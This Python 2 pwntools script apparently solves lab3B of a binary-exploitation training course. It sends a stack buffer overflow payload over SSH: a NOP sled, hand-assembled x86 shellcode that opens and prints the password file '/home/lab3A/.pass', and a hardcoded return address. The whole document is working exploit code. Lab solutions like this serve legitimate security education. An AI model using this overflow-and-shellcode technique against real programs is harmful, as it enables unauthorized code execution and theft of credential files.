#!/usr/bin/python
import sys
from pwn import *

def connect_remote(username, password, host, file):
    try:
        s = ssh(host=host, user=username, password=password)
    except:
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s

def process_local():
    pass

def asm_instructions():
    instructions = [
        # Push path on stack
        "push 0x73",
        "push 0x7361702e",
        "push 0x2f413362",
        "push 0x616c2f65",
        "push 0x6d6f682f",
        # Open file
        "mov ebx, esp",
        "xor ecx, ecx",
        "xor edx, edx",
        "mov al, 0x5",
        "int 0x80",
        # Read
        "sub esp, 50",
        "mov ebx, eax",
        "mov ecx, esp",
        "mov dl, 50",
        "mov al, 0x3",
        "int 0x80",
        # Write
        "mov dl, 50",
        "mov ecx, esp",
        "mov bl, 0x1",
        "mov al, 0x4",
        "int 0x80",
        # Close
        #"mov ebx, edi",
        #"xor eax, eax",
        #"mov al, 0x6",
        #"int 0x80",
        # Exit
        "xor ebx, ebx",
        "xor eax, eax",
        "mov al, 0x1",
        "int 0x80"
    ]
    return instructions

if __name__ == "__main__":
    p = connect_remote("", "", "", "")
    sh = p.run("sh")
    print "PID: %d" % (p.pid)

    ADDR = 0xbffffc10 - 0x10

    instructions = ''.join(map(asm, asm_instructions()))

    payload = "\x90" * 30
    payload += instructions
    payload += "\x90" * (156-(len(instructions)+30)) + struct.pack("<I", ADDR)

    sh.sendline("/levels/lab03/lab3B")
    sh.sendlineafter("just give me some shellcode, k", payload)
    sh.interactive()
